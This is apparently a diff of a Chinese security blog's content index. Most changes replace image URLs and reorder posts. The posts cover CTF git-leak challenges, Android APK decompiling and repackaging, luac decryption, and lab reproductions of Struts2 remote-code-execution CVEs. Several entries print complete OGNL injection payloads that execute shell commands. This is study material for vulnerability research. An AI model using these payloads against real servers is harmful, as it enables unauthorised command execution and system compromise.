-<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081824.png" alt="image"></p>
+<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p><img src="https://qiniu.hzktester.top/tp2020081824.png" alt="image"></p>
 <h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>查看历史记录</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>
 <p>切换版本</p>
@@ -1986,16 +1986,16 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure>
 <h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><ol>
 <li><p>扫描发现 .git 泄露</p>
-<p> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081825.png" alt="image"></p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081825.png" alt="image"></p>
 </li>
 <li><p>使用 GitHack 工具 clone 目标源代码到本地</p>
-<p> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081826.png" alt="image"></p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081826.png" alt="image"></p>
 </li>
 <li><p>执行 git log 查看历史记录</p>
-<p> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081827.png" alt="image"></p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081827.png" alt="image"></p>
 </li>
 <li><p>执行 git show 查看提交详情</p>
-<p> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081828.png" alt="image"></p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081828.png" alt="image"></p>
 <h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>git 泄露 .git/refs/stash</p>
 </li>
 </ol>
@@ -2005,17 +2005,17 @@
 </li>
 <li><p>利用GitHack 工具将网站源代码 clone 到本地</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
-<p> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081829.png" alt="image"></p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081829.png" alt="image"></p>
 </li>
 <li><p>查看 <strong>.git/refs/stash</strong> 找到 <strong>stash</strong> 对应的 <strong>hash</strong></p>
-<p> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081830.png" alt="image"></p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081830.png" alt="image"></p>
 </li>
 <li><p>git diff 9dbafcb8c4629b4b843991b6ebe5eca874812fc4 得到flag</p>
-<p> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081831.png" alt="image"></p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081831.png" alt="image"></p>
 </li>
 </ol>
-<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081832.png" alt="image"></p>
-<h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081833.png" alt="image"><br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081834.png" alt="image"></p>
+<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p><img src="https://qiniu.hzktester.top/tp2020081832.png" alt="image"></p>
+<h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><img src="https://qiniu.hzktester.top/tp2020081833.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020081834.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>Web基础</category>
@@ -2025,38 +2025,11 @@
       </tags>
   </entry>
   <entry>
-    <title>APP反编译-下载源码</title>
-    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</url>
-    <content><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol>
-<li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li>
-<li>解压<strong>dex2jar.jar</strong>文件</li>
-<li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li>
-<li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li>
-<li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote>
-<p>d2j-dex2jar.bat classes.dex</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p>
-<h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol>
-<li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li>
-<li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li>
-<li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li>
-</ol>
-]]></content>
-      <categories>
-        <category>APP渗透</category>
-      </categories>
-      <tags>
-        <tag>APP反编译</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>APP之反编译+目录结构+重新打包+重新签名</title>
     <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</url>
     <content><![CDATA[<h2 id="反编译和重新打包-apktool"><a href="#反编译和重新打包-apktool" class="headerlink" title="反编译和重新打包-apktool"></a>反编译和重新打包-apktool</h2><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/">https://ibotpeaches.github.io/Apktool/install/</a></p>
 <ol>
-<li>分别下载<strong>apktool.bat</strong>、<strong>apktool.jar</strong>，并把需要反编译的APP放在同一个目录中<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081604.png" alt="image"></li>
+<li>分别下载<strong>apktool.bat</strong>、<strong>apktool.jar</strong>，并把需要反编译的APP放在同一个目录中<br><img src="https://qiniu.hzktester.top/tp2020081604.png" alt="image"></li>
 <li>在cmd窗口下进入当前目录</li>
 <li>执行反编译命令，反编译后的文件默认输出在当前目录下的<strong>qipai</strong>文件夹<blockquote>
 <p>apktool d qipai.apk</p>
@@ -2066,7 +2039,7 @@
 <p>apktool b test</p>
 </blockquote>
 <a id="more"></a>
-<h2 id="APP目录结构"><a href="#APP目录结构" class="headerlink" title="APP目录结构"></a>APP目录结构</h2><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081605.png" alt="image"></li>
+<h2 id="APP目录结构"><a href="#APP目录结构" class="headerlink" title="APP目录结构"></a>APP目录结构</h2><img src="https://qiniu.hzktester.top/tp2020081605.png" alt="image"></li>
 <li><strong>AndroidManifest.xml</strong>：安卓应用程序的全局配置文件，参考文章<a href="http://blog.chinaunix.net/uid-9185047-id-3460344.html">AndroidManifest.xml配置文件详解 </a></li>
 <li><strong>assets</strong>:系统在编译的时候不会编译assets下的资源文件,也就是说dex文件不包含此目录下的文件（此处存放业务逻辑代码，luac加密，解密key存放于<strong>lib</strong>目录下的so文件）</li>
 <li><strong>classes.dex</strong>：源码文件</li>
@@ -2075,6 +2048,33 @@
 <li><strong>META-INF</strong>：apk的签名信息</li>
 </ol>
 <h2 id="APP重新签名"><a href="#APP重新签名" class="headerlink" title="APP重新签名"></a>APP重新签名</h2><p>参考文章：<a href="https://blog.csdn.net/lyq8479/article/details/6401093">Android应用程序签名详解</a></p>
+]]></content>
+      <categories>
+        <category>APP渗透</category>
+      </categories>
+      <tags>
+        <tag>APP反编译</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>APP反编译-下载源码</title>
+    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</url>
+    <content><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol>
+<li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li>
+<li>解压<strong>dex2jar.jar</strong>文件</li>
+<li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li>
+<li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="https://qiniu.hzktester.top/tp2020081601.png" alt="image"></li>
+<li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote>
+<p>d2j-dex2jar.bat classes.dex</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://qiniu.hzktester.top/tp2020081602.png" alt="image"></p>
+<h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol>
+<li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li>
+<li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="https://qiniu.hzktester.top/tp2020081603.png" alt="image"></li>
+<li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li>
+</ol>
 ]]></content>
       <categories>
         <category>APP渗透</category>
@@ -2096,7 +2096,7 @@
 <h2 id="寻找加密sign和key"><a href="#寻找加密sign和key" class="headerlink" title="寻找加密sign和key"></a>寻找加密sign和key</h2><p>要反编译.luac文件，需要知道加密<strong>key</strong>和<strong>sign</strong>。</p>
 <ol>
 <li><p>寻找加密<strong>sign</strong>:用记事本打开某个.luac文件，文件开头的前几个字符即加密sign</p>
-<p> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081606.png" alt="image"></p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081606.png" alt="image"></p>
 </li>
 <li><p>寻找加密<strong>key</strong></p>
 <ul>
@@ -2106,7 +2106,7 @@
 <li><strong>sign</strong>附近相似的值就是<strong>key</strong>的值<h2 id="解密luac文件"><a href="#解密luac文件" class="headerlink" title="解密luac文件"></a>解密luac文件</h2></li>
 </ul>
 </li>
-<li><p>下载<strong>XXTEADecrypt</strong>：<a href="http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe">http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe</a><br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081607.png" alt="image"></p>
+<li><p>下载<strong>XXTEADecrypt</strong>：<a href="http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe">http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe</a><br><img src="https://qiniu.hzktester.top/tp2020081607.png" alt="image"></p>
 </li>
 </ol>
 ]]></content>
@@ -2124,8 +2124,8 @@
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p>
 <a id="more"></a>
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfocus启动环境打开url<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li>
-<li>直接使用工具获得flag<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li>
+<li>使用vulfocus启动环境打开url<br><img src="https://qiniu.hzktester.top/tp2020081401.png" alt="image"></li>
+<li>直接使用工具获得flag<br><img src="https://qiniu.hzktester.top/tp2020081402.png" alt="image"></li>
 </ol>
 ]]></content>
       <categories>
@@ -2136,23 +2136,17 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-048 CVE-2017-9791复现过程</title>
-    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p>
+    <title>S2-046 CVE-2017-5638复现过程</title>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
 <a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
+<li><p>使用vulfocus启动环境<br><img src="https://qiniu.hzktester.top/tp2020081405.png" alt="image"></p>
 </li>
-<li><p>随意输入内容，使用burp抓取“submit”的数据包</p>
-</li>
-<li><p>poc利用</p>
+<li><p>直接使用工具拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081406.png" alt="image"></p>
 </li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p>
-<p>或直接使用工具<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -2172,12 +2166,12 @@
 <p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p>
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfoces搭建环境<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li>
+<li>使用vulfoces搭建环境<br><img src="https://qiniu.hzktester.top/tp2020081403.png" alt="image"></li>
 <li>POC利用</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081404.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -2187,17 +2181,23 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-046 CVE-2017-5638复现过程</title>
-    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
+    <title>S2-048 CVE-2017-9791复现过程</title>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p>
 <a id="more"></a>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
-<li><p>使用vulfocus启动环境<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="https://qiniu.hzktester.top/tp2020081407.png" alt="image"></p>
 </li>
-<li><p>直接使用工具拿到flag<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
+<li><p>随意输入内容，使用burp抓取“submit”的数据包</p>
+</li>
+<li><p>poc利用</p>
 </li>
 </ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qiniu.hzktester.top/tp2020081408.png" alt="image"></p>
+<p>或直接使用工具<br><img src="https://qiniu.hzktester.top/tp2020081409.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -2213,29 +2213,9 @@
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
 <a id="more"></a>
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081410.png" alt="image"></p>
 </li>
-<li><p>使用工具拿到flag<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-devMode CVE-2016-4438复现过程</title>
-    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081418.png" alt="image"></p>
-</li>
-<li><p>直接使用工具获得flag<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081419.png" alt="image"></p>
+<li><p>使用工具拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081411.png" alt="image"></p>
 </li>
 </ol>
 ]]></content>
@@ -2253,13 +2233,13 @@
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p>
 <a id="more"></a>
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfocus搭建漏洞环境<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081412.png" alt="image"></li>
+<li>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081412.png" alt="image"></li>
 <li>利用POC</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
 
 <ol start="3">
-<li>burp抓包构造payload<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li>
+<li>burp抓包构造payload<br><img src="https://qiniu.hzktester.top/tp2020081413.png" alt="image"></li>
 </ol>
 ]]></content>
       <categories>
@@ -2276,11 +2256,11 @@
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
 <a id="more"></a>
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081414.png" alt="image"></p>
 </li>
 <li><p>poc利用</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081415.png" alt="image"></p>
 </li>
 </ol>
 ]]></content>
@@ -2299,14 +2279,34 @@
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.0.0 - 2.5.20</p>
 <a id="more"></a>
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081416.png" alt="image"></p>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081416.png" alt="image"></p>
 </li>
 <li><p>POC利用：</p>
 </li>
 </ol>
